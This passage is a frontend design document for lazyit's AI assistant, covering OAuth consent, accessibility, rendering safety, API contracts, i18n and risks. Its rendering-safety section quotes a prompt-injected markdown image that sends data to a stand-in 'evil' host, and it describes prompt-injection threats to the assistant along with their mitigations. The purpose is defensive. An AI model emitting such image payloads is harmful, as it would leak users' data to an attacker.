     archive into `~/.claude/skills/lazyit/` (it loads as `lazyit@skills-dir`, with its `.mcp.json`), or
     try it for one session with `claude --plugin-dir ./lazyit-plugin.zip`.
  2. HTTPS: run `/mcp` to sign in. `lan`: create a personal token below; Claude Code asks for it when
     the plugin is enabled (it is stored in the OS keychain, never in the zip).

A collapsed "Other MCP clients" section shows the endpoint URL and a `.mcp.json` snippet.

Connected apps: `<ResourceTable>` with name (+ "unverified" mark), redirect host, scopes, authorized,
last used, and a Revoke action behind a confirm dialog. On `lan`, the same table lists personal tokens
(label, expiry) with a "Create token" action that shows the token once.

**Consent page (`/oauth/authorize`, AuthShell)**

```
lazyit ▪                                                   ◐
        ┌──────────────────────────────────────────────┐
        │ Allow “Claude Code” to access lazyit?        │
        │ ⚠ Name provided by the application — unverified
        │ It will act as you (ana@acme.io), with your  │
        │ permissions, and be able to:                 │
        │  • read inventory, access and knowledge base │  ← one line per scope (i18n)
        │  • propose and make changes                  │
        │  ☐ admin actions (roles, access) — step-up   │  ← lazyit.admin, never preselected
        │ Tokens will be sent to:                      │
        │  http://127.0.0.1:53682/callback             │  ← full redirect_uri, mono
        │ You can revoke this any time in              │
        │ Account › AI & connected apps.               │
        │                    [ Deny ]  [ Allow access ]│
        │ Not you? Sign out                            │
        └──────────────────────────────────────────────┘
```

- **CSRF**: the decision is a `fetch` POST with the **Bearer** header, and a cross-site form cannot
  set it. Framing is already denied (R).
- On success the API returns `{ redirectTo }`; the page follows it **only** if the scheme is
  `http`/`https` (defence in depth).
- If the caller lacks `ai:connect`, or MCP is off, the page shows an explanatory refusal and Deny.
- The access choice is Read only / Read & write (preselected); `lazyit.admin` is an explicit extra
  choice that asks for the password (R7). Consent is shown on every authorization.

### 5.4 Accessibility

- The panel is `<aside role="complementary" aria-label>`, non-modal at `md+`. The `<md` Sheet is
  modal (radix focus trap).
- Opening moves focus to the composer. `Esc` inside the panel closes it and returns focus to the
  launcher. `⌘J`/`Ctrl+J` toggles it (A: verify it overrides the browser's Downloads shortcut on
  Windows/Linux; fallback `Alt+J`).
- The message log is `role="log"` with `aria-busy` while streaming. Deltas are **not** announced; a
  separate polite live region announces "Assistant replied" and "Approval needed: Create asset
  ‹name›".
- The approval card is a `role="group"` labelled by its title. Before→after rows are a `<dl>`
  (`DetailField` precedent). Status is never colour alone: stamp text + icon.
- The composer sends on Enter and inserts a newline on Shift+Enter, with an `isComposing` guard.
  Stop is a real button.
- Reduced motion: no typewriter effect, the panel appears instantly, and tokens render as they
  arrive.
- Touch targets ≥44px below `md` (the `min-h-11` rail precedent).

### 5.5 Rendering safety

The chat variant of `MarkdownView` keeps sanitize-first and `disableKbExtensions`, **and**:
- renders **no images** (alt text only — prompt-injected `![](https://evil/?q=…)` is a known
  exfiltration channel);
- allows no mermaid;
- routes internal links through the router, while external links get
  `rel="noopener noreferrer" target="_blank"` plus a host hint.

Streaming text re-renders at most once per animation frame. Tool summaries render only escaped
text.

### 5.6 Error and limit states (closed set, from the backend)

| Code | UI |
| --- | --- |
| `AI_DISABLED` | notice + launcher hides (status invalidated) |
| `FORBIDDEN` | "You no longer have access to the assistant" |
| `PROVIDER_AUTH` | "The AI provider rejected the credentials" + admins get a link to Settings → AI |
| `PROVIDER_RATE_LIMIT` | "Busy — retry in {n}s" (uses `retryAfterSec`) + Retry |
| `PROVIDER_UNAVAILABLE` | Retry |
| `CONTEXT_LIMIT` | "This conversation is too long" + **Start a new chat** |
| `OUTPUT_TRUNCATED` | inline "reply cut short" + Continue |
| `RUN_IN_PROGRESS` | "Another window is answering" → follow that run's events |
| `BUDGET_EXCEEDED` | "Daily AI budget reached" + when it resets |
| `CONVERSATION_READ_ONLY` | "This chat used an earlier AI configuration" + **Start a new chat** |
| `STEP_UP_REQUIRED` | the approval card asks for the password again |
| `NETWORK` / interrupted | "Connection lost" → reconnect with `Last-Event-ID` (snapshot fallback) |
| unknown | generic + `RequestIdNote` |

### 5.7 Upgrade-safety (frontend lens)

- Off by default: an upgraded instance renders nothing new until an admin enables AI.
- `useAiStatus` treats 404/error as **off**.
- Unknown stream events, tool names, preview actions, notes and error codes degrade to generic
  renderings. Persisted parts of an unknown type render "unsupported content", never crash.
- No web-side data migration.
- The role editor needs `permissionMeta` copy for `ai:use` and `ai:connect` in both locales or it shows
  a raw key.

### 5.8 As built — `/account/ai` and the consent page (W3-9, #1315)

Code: `apps/web/app/(app)/account/ai/**`, `apps/web/app/(auth)/oauth/authorize/**`,
`lib/api/endpoints/oauth.ts`, `lib/api/hooks/use-oauth-grants.ts`, `lib/auth/login-callback.ts`,
`messages/{en,es}/oauth.json`. §5.3 holds, with these concrete choices:

- **Mode detection** (`account/ai/_lib/mcp-snippets.ts` `detectMcpConnectMode`, bun-tested): from
  `GET /ai/status` `mcp` plus the page's own protocol. `unknown` (loading, error, 404, unrecognized body)
  offers nothing; `unavailable` (switch off or no `ai:connect`) explains that existing connections are
  paused; `oauth` adds a warning when the page itself was opened over `http:`; `personal-token` explains
  *plain HTTP* (OAuth needs HTTPS) or, when the page is on `https:`, that the instance has no HTTPS
  `WEB_ORIGIN`. Every mode also states what cloud connectors (claude.ai, ChatGPT) need; `oauth` adds the
  internal-CA note (`NODE_EXTRA_CA_CERTS`).
- **Install panel** — `account/ai/_components/mcp-install-panel.tsx` `McpInstallPanel({ auth })`, the
  component Settings → AI embeds. HTTPS: the two marketplace commands (the marketplace name mirrors the
  API's `marketplaceName`), `/mcp` to sign in, and how to enable auto-update. Every mode: the authenticated
  zip download (`ORIGIN_UNKNOWN` and 404 explained), unzip commands, `--plugin-dir` for one session.
  "Other MCP clients": Claude Code (`claude mcp add --transport http`), Cursor (`mcp.json` `mcpServers`),
  VS Code (`.vscode/mcp.json`; on `lan` a `promptString` password input, so the token is not written to
  the file), generic. Snippets carry the placeholder `YOUR_PERSONAL_TOKEN`, never a token. Copy works on
  plain HTTP (legacy `execCommand` fallback).
- **Connected apps** — one list from `GET /oauth/grants/mine` (it returns both kinds, as an array, not a
  `Page`); revoke through `DELETE /oauth/grants/:id` for both kinds. Personal tokens: create only in
  `personal-token` mode with MCP on; expiry 30/90/180/365 (default 90); read or read & write; the token
  lives only in the dialog's state (never the query cache), the dialog is locked until "I've saved it"
  (the #813 pattern). The live cap (20) is not in `@lazyit/shared`; the web mirrors it as guidance and the
  API's 409 is the gate.
- **User menu** — "AI & connected apps" for `ai:connect` holders whenever `GET /ai/status` succeeds (so an
  older API hides it), even with MCP off, so paused connections stay revocable. The layout breadcrumb
  labels the `ai` segment ("AI" / "IA").
- **Consent page** — a Server Component validates with the session token (`POST /oauth/authorize/validate`)
  and renders an explanation for every stop: refusal, 404 (no authorization server: `lan` or no HTTPS
  origin), malformed or repeated parameters, a 401 (→ `/login?expired=1&callbackUrl=<this URL>`), a forced
  password change (→ `/change-password`). A client-owned `400 { error, redirectTo }` from validate is
  **offered** as a "Return to <host>" link, never followed automatically. The decision is a browser
  `fetch` with the Bearer (TanStack mutation; its 403 refusals and step-up codes are handled inline and are
  never a logout). The page follows a redirect only when `isRedirectToClient` accepts it: same scheme, host
  and path as the registered `redirect_uri`, no userinfo or fragment, never a script-capable scheme —
  **custom schemes are allowed** (Cursor registers `cursor://…`), which replaces §5.3's "http/https only".
  The trust signal is the redirect host in large mono type, then the full URI; `client_uri` is plain
  unlinked text labelled "not checked". Unverified clients get a warning callout **and** a second
  confirmation dialog before the approval is sent. `lazyit.admin` is a separate checkbox, never
  preselected, with a password field; `STEP_UP_UNAVAILABLE` unticks it. Nothing is remembered. Framing is
  already denied app-wide (`next.config.ts` `frame-ancestors 'none'` + `X-Frame-Options: DENY`, Caddy),
  so no header change was needed.
- **`proxy.ts`** — the one-line change: the login redirect is built by `loginCallbackPath(nextUrl)`, which
  keeps `pathname + search` as `callbackUrl` (bun-tested; `/login` still applies `safeInternalPath`). It
  adds no OIDC-specific path (#1310).

**Found while building (for the backend lane).** In local mode `POST /auth/logout` bumps the user's
`sessionEpoch`, and grants snapshot the epoch — so a user who signs out of the web app silently loses
every OAuth connection **and every personal token**. The Manual states it; whether a browser sign-out
should end MCP connections is a product call.

---

## 6. Permission gating (UI only — the API decides)

| Surface | Gate |
| --- | --- |
| Launcher + panel | `GET /ai/status → chat.available` (server-combined: enabled ∧ provider configured ∧ `ai:use`) |
| Settings → AI, hub card | `settings:manage` (`AdminGate`) |
| `/account/ai` install panel | `mcp.available` (MCP switch ∧ `ai:connect`) |
| `/account/ai` connected apps | `ai:connect` (own grants) |
| Consent page | session + server checks (`ai:connect`, MCP enabled, HTTPS instance) |
| Admin all-users connected apps | `settings:manage` (R9) |
| Per-SA AI access | `settings:manage` |

---

## 7. Contracts required from the backend (reconciled)

All shapes are zod in `@lazyit/shared` (a contract change owned by the backend lane), list reads
follow `Page<T>` ([[0030-list-pagination-contract]]), and every response carries `X-Request-Id`. The
reconciled shapes are in [[ai-assistant/_synthesis|the synthesis]] §4; this is what the web consumes.

**K1 — Status** `GET /ai/status` (any authenticated caller):
`{ chat: { available: boolean }, mcp: { available: boolean, auth: "oauth" | "personal-token" },
configRevision: string, retentionDays: number | null }` — no provider secrets. `chat.available` =
enabled ∧ provider configured ∧ `ai:use`; `mcp.available` = MCP switch on ∧ `ai:connect`. The MCP URL
is always `window.location.origin + "/mcp"`.

**K2 — Config** (`settings:manage`), mirroring `/config/smtp`
([[ai-assistant/provider-and-runtime|provider]] §9.1):
- `GET /config/ai` → `{ enabled, provider: "anthropic"|"openai"|"google"|"openai-compatible"|null,
  model, baseUrl?, apiKeySet, keyConfigured, allowPrivateNetwork, extras: {…}, mcpEnabled,
  retentionDays, dailyTokenLimitPerPrincipal, disclosureAcknowledgedAt }`.
- `PUT /config/ai` — the key is write-only; omit it to keep the stored one; changing the provider or
  base URL requires a new key; the first enable carries the disclosure acknowledgement.
- `POST /config/ai/test` → HTTP 200 `{ ok, checks: { auth, model, toolCalling }, latencyMs?, error? }`
  against a **draft or** the saved config.
- `POST /config/ai/models` → the model list for the combobox (free text always allowed).
- `GET|PUT /config/ai/service-accounts/:id` → `{ access: "off" | "read-only" | "read-write",
  maxMutationsPerRun: number | null }` — the per-SA AI access setting (CEO, round 2).

**K3 — Conversations** (`ai:use`, own conversations only):
- `GET /ai/conversations` → `Page<{ id, title, updatedAt, status, readOnly }>`
- `GET /ai/conversations/:id` → `{ id, title, status: "idle"|"running"|"awaiting-approval", readOnly,
  activeRunId?, messages: PersistedMessage[] }`, where persisted parts use the same types as the run
  events (text · tool activity · approval with its current state · notice)
- `DELETE /ai/conversations/:id` (hard-deletes the transcript; the ledger survives)

**K4 — Send and follow (R2)**:
- `POST /ai/conversations` → `{ id }`; `POST /ai/conversations/:id/messages { text, context?: { route,
  entity?: { type, id } } }` → `202 { runId }`. A second active run on the same conversation → `409
  RUN_IN_PROGRESS`.
- `GET /ai/runs/:id/events` → `text/event-stream`, read with `fetch` + `ReadableStream` and an
  `Authorization: Bearer` header (never `EventSource`, never a token in the URL). Each event has
  `id: <runId>:<seq>`; the client reconnects with `Last-Event-ID`, and the server replays from its ring
  buffer or sends `run.snapshot`. `: ` heartbeats every 15 s. The stream closes after a terminal status
  or after `AWAITING_APPROVAL`.
- The event union (`v: 1`) is `run.snapshot`, `run.status`, `message.delta`, `message.completed`,
  `tool.call { kind: read|mutation|navigate }`, `tool.approval_required { preview, elevated,
  stepUpRequired, untrustedSources, expiresAt }`, `tool.approval_resolved`, `tool.result { kind,
  mutated, entityRefs[] }`, `step.finished`, `run.finished { status, error? }`. Unknown events are
  ignored by the reducer.
- `EntityRef = { type, id, op, slug?, label? }`; the web builds every href.
- `AiActionPreview` = the server-built preview ([[ai-assistant/tools-and-execution|tools]] §9 and §16):
  `changes[]` (field, before, after, `valueKind`), `warnings[]` codes, `impacted[]`,
  `untrustedSources[]`, `elevated`, `stepUpRequired`. **Nothing in it comes from model prose.**
- If the client disconnects, the run continues and persists (it never executes an unapproved
  mutation).

**K5 — Approval decision** `POST /ai/runs/:id/tool-calls/:toolCallId/decision { decision:
"approve"|"reject", reason?, password? }`:
- Human sessions only; bound to the caller and the exact pending tool input; single-use; TTL-bound.
  `password` is the step-up for `elevated` actions.
- Returns JSON `{ runId, status }`; the client re-subscribes to the run's events. As built (W3-1):
  `409 RUN_NOT_AWAITING_APPROVAL` = the run no longer waits (already decided and resumed, cancelled,
  finished); core's `409` refusals (already decided, `EXPIRED`, `STALE`) pass through; `409 AI_DISABLED`;
  `403 STEP_UP_REQUIRED` (no password), `403 STEP_UP_FAILED` (wrong password), `403 STEP_UP_UNAVAILABLE`
  (no lazyit password in this sign-in mode), `429 STEP_UP_RATE_LIMITED` with `retryAfterSec`. **None of
  these 403s means the session ended — the web must not treat them as a logout.**
- **The card can change under the user** (#1357): core re-runs the preview at approve time. When a
  warning appeared since the proposal (say, the application became critical), the stored preview gains
  it, nothing executes, the action stays pending, and the decision answers `409 PREVIEW_CHANGED` — or
  `403 STEP_UP_REQUIRED` when the new warning needs the password — with `addedWarnings: string[]` (the
  warning codes added). The web re-reads the pending card (re-subscribe → `run.snapshot`, or
  `GET /ai/conversations/:id`), highlights the added warnings, and lets the user decide again (with the
  password field when step-up is now required). It is not an error state and not a logout.
- **A password is no guarantee.** A decision sent WITH the password can still answer `403
  STEP_UP_REQUIRED` + `addedWarnings`: the password is only checked when the stored card asked for it,
  and a step-up warning that appeared since (say, the application became critical) is found by core
  afterwards. Re-render the card with the added warnings and let the user retry with the password.
- `POST /ai/runs` with an `Idempotency-Key` reused for another prompt or conversation answers `422
  IDEMPOTENCY_KEY_MISMATCH` — use a new key per request.

**K6 — Stop** `POST /ai/runs/:id/cancel` → the run is cancelled at the next step boundary; partial
output is persisted.

**K7 — Skill** (R8): `GET /ai/claude-code/plugin.zip` (`ai:connect`) → `application/zip`, the Claude
Code plugin (the `lazyit` skill + `.mcp.json`), pre-filled with the instance origin; always available
while MCP is enabled. On an HTTPS instance with MCP enabled, the public
`/ai/claude-code/marketplace.json` also exists for the one-command install.

**K8 — OAuth (web-facing parts only)** ([[ai-assistant/mcp-and-oauth|MCP]] §5.1–5.2):
- The authorization endpoint **is the web page** `/oauth/authorize?<OAuth parameters>`. Its server
  component calls `POST /oauth/authorize/validate` (Bearer) with the raw parameters →
  `{ client: { id, name, uri?, verified }, redirectUri, redirectHost, loopbackOnly, scopes: Scope[],
  user: { email } }` or a typed refusal (`AI_DISABLED`, `FORBIDDEN`, `INVALID_CLIENT`,
  `INVALID_REDIRECT`). An invalid client or redirect renders an error page, never a redirect.
- `POST /oauth/authorize/decision` (Bearer) with the same raw parameters plus the chosen scope →
  `{ redirectTo }` (code + state + iss, or `error=access_denied`). The API re-validates everything.
- `GET /oauth/grants/mine` → `Page<{ id, kind: "oauth"|"personal", client?: { name, verified },
  label?, redirectHost?, scopes, createdAt, lastUsedAt, expiresAt? }>`; `DELETE /oauth/grants/:id`
  (own).
- `POST /oauth/personal-tokens { label, expiresInDays, scopes? }` → the token, shown once (`lan` only;
  `scopes` ⊆ `lazyit.read`/`lazyit.write`, default both). 403 `{ code: "OAUTH_INSTANCE" | "AI_DISABLED" }`
  explains why it cannot be minted; `GET /oauth/personal-tokens` lists them, `DELETE
  /oauth/personal-tokens/:id` revokes one ([[ai-assistant/mcp-and-oauth|MCP]] §14).
- Admin: `GET /oauth/grants?userId=` and `DELETE /oauth/grants/:id` (`settings:manage`, R9).
- `Scope` is a closed enum — `lazyit.read`, `lazyit.write`, `lazyit.admin` — localized by the web.

**K9 — Permissions** `ai:use` and `ai:connect` in `PermissionSchema` + `PERMISSION_META`; their
ADMIN + MEMBER defaults are applied by the #1314 seed-once ledger on the next deploy, with no data
migration.

---

## 8. Manual and i18n plan

### 8.1 i18n — three new namespaces (disjoint files → parallel units)

| Namespace | File owner | Subtrees |
| --- | --- | --- |
| `ai` | chat unit | `launcher`, `panel`, `composer`, `message`, `tools.generic.*` + `tools.<toolName>.*` (fallback generic), `approval.{actions.*, states.*, notes.*, fields.*}`, `effects`, `errors.<CODE>`, `history.{groups.*, …}`, `context` |
| `aiSettings` | settings unit | `wizard.steps.*`, `provider.<id>.description`, `credentials`, `model`, `extras`, `test`, `review`, `editor.*`, `mcp`, `danger`, `adminGrants` |
| `oauth` | MCP/consent unit | `install.*` (steps, commands' surrounding copy), `connectedApps.*`, `consent.{title, unverified, actsAsYou, scopes.<scope>, redirectTo, allow, deny, refusal.*}` |

- Plus `settings.json`: `hub.ai.{title,description}`, `permissionMeta` for `ai:use` and `ai:connect`,
  and the per-SA AI access strings on the Service Account page.
- Plus `help.json`: the new category and subcategory labels.
- Plus `shared.json`: user-menu item `chrome.aiAndConnectedApps`.
- Provider **brand names are data** and are not translated. Tool names, codes and scope ids are
  data; only their display strings are translated.
- A covering-set `bun test` asserts every `AiErrorCode` / `Scope` / preview `action` has a key in
  **both** catalogs.

### 8.2 Manual — new category `ai-assistant`

Placed after `access-automation` in `_nav.ts`. Fourteen new files (en + es):

| Slug | Content |
| --- | --- |
| `ai-assistant-overview` | what it is, off by default, what data goes to the provider, `ai:use`, `ai:connect` |
| `ai-assistant-setup` | the admin wizard, the four providers, test, edit, turn off, retention |
| `ai-assistant-using-the-chat` | ⌘J, page context, history, limits and errors |
| `ai-assistant-approvals` | preview cards, approve/reject, where executed actions are recorded |
| `ai-assistant-claude-code-mcp` | enable MCP, install the skill, connect Claude Code and other clients, the consent screen |
| `ai-assistant-connected-apps` | review and revoke; admin revoke |
| `ai-assistant-troubleshooting` | provider errors, proxies buffering streams, HTTPS required for MCP sign-in |

Edits to existing pages (en + es):
- `permissions`, `users-permissions-roles`, `users-permissions-permission-configuration`: `ai:use`,
  `ai:connect`
- `users-permissions-service-accounts`: the headless API and the per-SA AI access setting
- `security-best-practices-security-model`, `security-best-practices-operational-security`: data
  egress, prompt injection, approvals
- `reference-glossary`: MCP, OAuth client, approval card, provider
- `getting-started-your-profile`: Account → AI & connected apps
- `deployment-operations-reverse-proxy-tls`: streaming + HTTPS note
- `configuration-instance-settings`: link to Settings → AI

---

## 9. Deliberately NOT built

- Click-by-click UI driving (CEO).
- A full-page `/assistant` route; chat tabs.
- The AI SDK's Redis-backed `resumable-stream` (the run event bus, `Last-Event-ID` and `run.snapshot`
  cover reconnection — R2).
- "Approve all", per-user model choice, message edit, regenerate or branching.
- File or image attachments; voice.
- Sharing conversations; admins reading others' conversations.
- Usage/cost dashboards and quotas UI.
- Live push of MCP-originated changes into open tabs (refetch-on-focus covers it).
- AI SDK UI / assistant-ui dependencies.
- Generative UI beyond the approval card, activity lines and effect chips.
- A frontend DOM test runner (ADR-0012 defers it).

---

## 10. Risks

1. **Streaming through Caddy `encode zstd gzip`** — Caddy flushes SSE, but its docs are silent on
   the compressor. Infra must verify, or exclude `text/event-stream` from `encode`. Local
   `next dev` talks to `:3001` directly and would hide it.
2. ~~**Consent after login is broken today**~~ — fixed in W3-9 (§5.8): `proxy.ts` keeps the query in
   `callbackUrl` (auth-sensitive → CEO merge).
3. **Model prose ≠ executed action** — mitigated by rendering the card only from the server preview.
4. **Prompt-injection exfiltration via markdown images** — mitigated by the chat renderer.
5. **Unsaved edits lost to AI navigation** — mitigated by D3 + the dirty registry.
6. **Double execution** (double-click, two tabs) — disabled buttons + single-use server approvals
   (409).
7. **Plain-HTTP `lan` instances** — OAuth is disabled there by design; the UI offers personal tokens,
   the Manual explains why.
8. **Launcher pop-in** after the status fetch (minor layout shift at the header's right cluster).
9. **`Ctrl+J` collides** with the browser Downloads shortcut on Windows/Linux (to verify).
10. **Issue #1310 in flight** — it will rewrite `proxy.ts`/login. Coordinate the callbackUrl fix.
11. **Over-fetch from C3** on heavy mounted pages — use a denylist predicate if measured.

---

## 11. Resolved decisions

1. **MCP without an LLM provider → yes, two independent switches** (CEO, round 2).
2. **Non-admins' install + connected apps at `/account/ai`** for holders of `ai:connect`; Settings → AI
   shows the same install panel to admins (R9).
3. **Navigation → auto-navigate only for an explicit `navigate`-kind tool and only when no
   unsaved-changes guard is active**; otherwise an "Open" chip (R3).
4. **Turning AI off → keep conversations and connected apps dormant** (retention keeps running; MCP
   tokens are refused while MCP is off and work again on re-enable). Adopted by default, CEO to confirm.
5. **Admins see and revoke every user's connected apps** in Settings → AI (R9).
6. **Users may delete their own conversations** before retention; the ledger survives. Adopted by
   default.
7. **Current page's entity as context** (a visible, removable chip) → yes, adopted by default. Only the
   route and an entity ref are sent — never page content or decrypted vault data
   ([[ai-assistant/security|security]] T-39).

## 12. Implementation units (superseded)

> **Superseded** by the unified wave plan in [[ai-assistant/_synthesis|the synthesis]] §10. Kept for
> traceability of this slice's original decomposition.

| Unit | Lane | Owns | Waits on | Shared-critical contact |
| --- | --- | --- | --- | --- |
| **U0** contracts | backend | the `packages/shared` AI schemas (K1–K9), `ai:use`, `PERMISSION_META` | — | the barrel |
| **U1** shell foundation (serial, first) | frontend + manual manifest | the one `app/(app)/layout.tsx` edit; `components/ai/ai-assistant-root.tsx`, `ai-chat-launcher.tsx`, `ai-chat-panel-slot.tsx`; `apiFetchStream`; status endpoint + hook; the `ai`, `aiSettings`, `oauth` namespaces in `messages/{en,es}/_all.ts`; the `ai-assistant` category in `content/manual/_nav.ts` + `help.json` | U0 | `layout.tsx`, `_nav.ts`, both `_all.ts` barrels |
| **U2** chat (core + UI) | frontend | `lib/ai/**`, `components/ai/**` (except U1's files), chat endpoints and hooks, `messages/*/ai.json`, the unsaved-changes registry, chat Manual pages | U1 | none |
| **U3** Settings → AI | frontend | `app/(app)/settings/ai/**`, config endpoints and hooks, `messages/*/aiSettings.json`, `settings.json`, the hub card, a vendored `radio-group`, setup Manual pages | U1 | none |
| **U4** MCP install, connected apps, consent | frontend (`proxy.ts` edit → CEO merge) | `app/(app)/account/ai/**`, `app/(auth)/oauth/**`, `lib/ai/mcp-snippets.ts`, OAuth endpoints and hooks, `messages/*/oauth.json`, `shared.json`, `user-menu.tsx`, the `proxy.ts` callbackUrl fix, MCP Manual pages | U1 | none |
| **U5** Manual edits to existing pages | documentation | the existing pages in §8.2 | U2–U4 | none |
| **U6** ADR | frontend/docs | folded into ADR-0097 | — | `_MOC.md` |

Related: [[0020-frontend-data-layer]] · [[0067-server-prefetch-ssr-strategy]] ·
[[0046-roles-permissions-v2]] · [[0049-activated-restraint-ux-direction]] ·
[[0077-ledger-design-language-frontend-refactor]] · [[0051-i18n-next-intl]] ·
[[0056-in-app-notification-bell]] · [[0062-in-app-help-manual-surface]] ·
[[0072-quick-view-entity-preview]] · [[0079-instance-smtp-outbound-email]] ·
[[0087-plain-http-lan-deployment-axis]] · [[0012-testing-strategy]] · [[manual-authoring]] ·
[[i18n]] · [[ssr-prefetch-recipe]]
